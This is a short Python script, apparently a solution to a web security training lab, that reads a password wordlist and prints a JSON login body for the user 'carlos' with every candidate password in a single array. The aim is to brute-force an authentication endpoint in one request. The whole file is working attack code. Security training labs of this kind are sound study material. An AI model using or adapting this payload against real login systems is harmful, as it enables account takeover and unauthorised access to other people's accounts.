with open('../passwords.txt') as f:
    passwords = f.read().splitlines()
payload = '{"username":"carlos","password":['
print (payload)
for p in passwords:
    print (f'"{p}",')
print (']}')